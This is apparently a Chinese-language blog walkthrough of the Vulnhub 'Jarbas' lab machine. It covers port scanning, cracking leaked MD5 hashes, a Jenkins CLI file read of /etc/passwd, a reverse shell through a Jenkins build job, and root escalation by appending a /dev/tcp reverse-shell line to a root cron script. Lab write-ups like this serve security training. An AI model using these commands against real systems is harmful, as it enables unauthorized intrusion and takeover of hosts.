---
title: Vulnhub-Jarbas-Jenkins
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# Jarbas-Jenkins

> [https://www.vulnhub.com/entry/jarbas-1,232/](https://www.vulnhub.com/entry/jarbas-1,232/)
> 

## 主机发现端口扫描

- 扫描网段存活主机，因为主机是我最后添加的，所以靶机地址是`135`的
    
    ```php
    nmap -sP 192.168.75.0/24   
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-21 14:03 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00032s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00036s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.135
    Host is up (0.00032s latency).
    MAC Address: 00:0C:29:08:91:76 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00021s latency).
    MAC Address: 00:50:56:F8:B3:1A (VMware)
    Nmap scan report for 192.168.75.131
    Host is up.
    ```
    
- 扫描主机开放端口，开放端口：`22,80,3306,8080`
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.135
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-21 14:05 CST
    Nmap scan report for 192.168.75.135
    Host is up (0.00074s latency).
    Not shown: 65531 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    3306/tcp open  mysql
    8080/tcp open  http-proxy
    MAC Address: 00:0C:29:08:91:76 (VMware)
    ```
    
- 扫描服务版本及系统版本
    
    ```php
    nmap -sT -sV -O -p22,80,3306,8080 192.168.75.135
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-21 14:07 CST
    Nmap scan report for 192.168.75.135
    Host is up (0.00076s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
    80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
    3306/tcp open  mysql   MariaDB (unauthorized)
    8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
    MAC Address: 00:0C:29:08:91:76 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    ```
    
- 扫描漏洞，没什么值得注意的漏洞，不过发现了两个文件夹`/icons/` 和`/robots.txt`
    
    ```php
    map -script=vuln -p22,80,3306,8080 192.168.75.135
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-21 14:08 CST
    Nmap scan report for 192.168.75.135
    Host is up (0.00032s latency).
    
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-trace: TRACE is enabled
    | http-enum: 
    |_  /icons/: Potentially interesting folder w/ directory listing
    3306/tcp open  mysql
    8080/tcp open  http-proxy
    | http-enum: 
    |_  /robots.txt: Robots file
    MAC Address: 00:0C:29:08:91:76 (VMware)
    
    ```
    
    渗透优先级 ：`80,8080`→`3306`→`22`
    

## WEB渗透

### 80端口

- 扫描目录 `192.168.75.135:80`
    
    ```php
    python .\dirsearch.py -u http://192.168.75.135/
    //
    [14:12:53] 200 -  359B  - /access.html
    [14:12:58] 403 -  210B  - /cgi-bin/
    ```
    
- 发现`/access.html` ，访问发现是有用的信息
    
    ```php
    Creds encrypted in a safe way!
    <image>
    tiago:5978a63b4654c73c60fa24f836386d87
    trindade:f463f63616cb3f1e81ce46b39f882fd5
    eder:9b38e2b1e8b12f426b0d208a7ab6cb98
    ```
    
    乍一看很像MD5，破解后得到以下内容，大概是一些账号密码，在哪里使用暂时还不知道
    
    ```php
    tiago:italia99
    trindade:marianna
    eder:vipsu
    ```
    
- 再查看前面nmap扫描出来的`icons` 目录，发现没什么有用的信息

### 8080端口

- 访问`8080`端口，发现是登陆页面，并且是`Jenkins CMS`
    
    ![image.png](image%208.png)
    
- 先访问nmap扫描出来的`robots.txt` ,获得以下内容
    
    ```php
    # we don't want robots to click "build" links
    User-agent: *
    Disallow: /
    ```
    
    感觉也没啥利用的
    
- 回到登陆页面，尝试使用之前获得的用户信息登录
    
    发现 `eder:vipsu` 可以登录进去
    
- 进入后台，仔细挖掘一些有用的设置
    
    `Jenkins CLI , 脚本命令行 , 系统信息` 等都是我们感兴趣的
    
    ![image.png](image%209.png)
    
    进入`关于jenkins` ，发现版本是 `2.113`
    

## 漏洞利用

- 查阅信息，发现存在任意文件读取 **CVE-2024-23897，**我们尝试利用
    
    > [https://blog.csdn.net/qq_34594929/article/details/136446671](https://blog.csdn.net/qq_34594929/article/details/136446671)
    > 
- 进入`Jenkins CLI` ，下载 `Jenkins-cli.jar`
- 然后到 `管理Jenkins` →`全局安全设置` →`勾选匿名用户具有可读权限`
- 打开kali命令行输入，获得`/etc/passwd`
    
    ```php
    java -jar jenkins-cli.jar -s http://192.168.75.135:8080 connect-node '@/etc/passwd'
    //
    icked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
    ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin: No such agent "ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin" exists.
    systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin: No such agent "systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin" exists.
    daemon:x:2:2:daemon:/sbin:/sbin/nologin: No such agent "daemon:x:2:2:daemon:/sbin:/sbin/nologin" exists.
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin: No such agent "lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin" exists.
    root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
    jenkins:x:997:995:Jenkins Automation Server:/var/lib/jenkins:/bin/false: No such agent "jenkins:x:997:995:Jenkins Automation Server:/var/lib/jenkins:/bin/false" exists.
    adm:x:3:4:adm:/var/adm:/sbin/nologin: No such agent "adm:x:3:4:adm:/var/adm:/sbin/nologin" exists.
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown: No such agent "shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown" exists.
    sync:x:5:0:sync:/sbin:/bin/sync: No such agent "sync:x:5:0:sync:/sbin:/bin/sync" exists.
    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin: No such agent "mail:x:8:12:mail:/var/spool/mail:/sbin/nologin" exists.
    dbus:x:81:81:System message bus:/:/sbin/nologin: No such agent "dbus:x:81:81:System message bus:/:/sbin/nologin" exists.
    postfix:x:89:89::/var/spool/postfix:/sbin/nologin: No such agent "postfix:x:89:89::/var/spool/postfix:/sbin/nologin" exists.
    operator:x:11:0:operator:/root:/sbin/nologin: No such agent "operator:x:11:0:operator:/root:/sbin/nologin" exists.
    eder:x:1000:1000:Eder Luiz:/home/eder:/bin/bash: No such agent "eder:x:1000:1000:Eder Luiz:/home/eder:/bin/bash" exists.
    apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin: No such agent "apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin" exists.
    mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin: No such agent "mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin" exists.
    polkitd:x:999:997:User for polkitd:/:/sbin/nologin: No such agent "polkitd:x:999:997:User for polkitd:/:/sbin/nologin" exists.
    sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin: No such agent "sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin" exists.
    halt:x:7:0:halt:/sbin:/sbin/halt: No such agent "halt:x:7:0:halt:/sbin:/sbin/halt" exists.
    nobody:x:99:99:Nobody:/:/sbin/nologin: No such agent "nobody:x:99:99:Nobody:/:/sbin/nologin" exists.
    games:x:12:100:games:/usr/games:/sbin/nologin: No such agent "games:x:12:100:games:/usr/games:/sbin/nologin" exists.
    chrony:x:998:996::/var/lib/chrony:/sbin/nologin: No such agent "chrony:x:998:996::/var/lib/chrony:/sbin/nologin" exists.
    bin:x:1:1:bin:/bin:/sbin/nologin: No such agent "bin:x:1:1:bin:/bin:/sbin/nologin" exists.
    
    ERROR: Error occurred while performing this command, see previous stderr output.
    ```
    
    但是读取不了`/etc/shadow` ,不过我们发现`/etc/passwd`里面存在`eder` 用户，和我们进入后台的用户名一样，我们尝试一下使用`ssh`登录，登陆失败，换条路子走
    

## 利用Jenkins后台反弹shell

- 发现 新建任务里面的构建一个自由风格的软件项目里面可以执行`shell`代码
    
    ![image.png](image%2010.png)
    
- 输入反弹shell代码保存
    
    ![image.png](image%2011.png)
    
- kali开启监听
    
    ```php
    nc -lvp 1234
    //            
    listening on [any] 1234 ...
    ```
    
- 在Jenkins里面点击构建，就会执行刚刚输入的代码
- 成功获得shell
    
    ```php
    nc -lvp 1234
    listening on [any] 1234 ...
    192.168.75.135: inverse host lookup failed: Unknown host
    connect to [192.168.75.131] from (UNKNOWN) [192.168.75.135] 54884
    
    python -c "import pty;pty.spawn('/bin/bash')" // 获得交互shell
    bash-4.2$ ls
    ls
    bash-4.2$ 
    
    ```
    

## 提权

- 查看通过Jenkins后台获得的shell权限
    
    ```php
    bash-4.2$ whoami
    jenkins
    //
    bash-4.2$ sudo -l
    We trust you have received the usual lecture from the local System
    Administrator. It usually boils down to these three things:
    
        #1) Respect the privacy of others.
        #2) Think before you type.
        #3) With great power comes great responsibility.
    
    [sudo] password for jenkins: ^C //要密码
    //                                                                                           
    bash-4.2$ uname -a
    Linux jarbas 3.10.0-693.21.1.el7.x86_64 #1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
    //
    bash-4.2$ ls -l
    total 0
    //
    bash-4.2$ dpkg -l
    bash: dpkg: command not found
    ```
    
    权限不高不低
    
- 尝试查看`crontab`是否有`root`运行的自动化任务
    
    ```php
    bash-4.2$ cat /etc/crontab
    cat /etc/crontab
    SHELL=/bin/bash
    PATH=/sbin:/bin:/usr/sbin:/usr/bin
    MAILTO=root
    # For details see man 4 crontabs
    
    # Example of job definition:
    # .---------------- minute (0 - 59)
    # |  .------------- hour (0 - 23)
    # |  |  .---------- day of month (1 - 31)
    # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
    # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
    # |  |  |  |  |
    # *  *  *  *  * user-name  command to be executed
    */5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
    ```
    
    文件内容是：
    
    ```php
    bash-4.2$ cat /etc/script/CleaningScript.sh
    #!/bin/bash
    
    rm -rf /var/log/httpd/access_log.txt
    ```
    
    存在一条每隔五分钟 使用root权限清理某些东西的自动化任务
    
- 我们可以尝试追加反弹shell在该脚本尾部，让它使用root权限来执行反弹shell代码
    
    提权成功，获得root权限，并且读取flag内容
    
    ```php
    bash-4.2$ echo "/bin/bash >& /dev/tcp/192.168.75.131/1235 0>&1" >> /etc/script/CleaningScript.sh
    //
    <& /dev/tcp/192.168.75.131/1235 0>&1" >> /etc/script/CleaningScript.sh       
    ```
    
    ```php
    nc -lvp 1235                                                        
    listening on [any] 1235 ...
    //
    192.168.75.135: inverse host lookup failed: Unknown host
    connect to [192.168.75.131] from (UNKNOWN) [192.168.75.135] 58338
    python -c "import pty;pty.spawn('/bin/bash')"
    [root@jarbas ~]# whoami
    whoami
    root
    [root@jarbas ~]# uname -a
    uname -a
    Linux jarbas 3.10.0-693.21.1.el7.x86_64 #1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
    [root@jarbas ~]# dpkg -l
    dpkg -l
    bash: dpkg: command not found
    [root@jarbas ~]# cat flag.txt //读取flag
    cat flag.txt
    Hey!
    
    Congratulations! You got it! I always knew you could do it!
    This challenge was very easy, huh? =)
    
    Thanks for appreciating this machine.
    
    @tiagotvrs 
    [root@jarbas ~]# 
    
    ```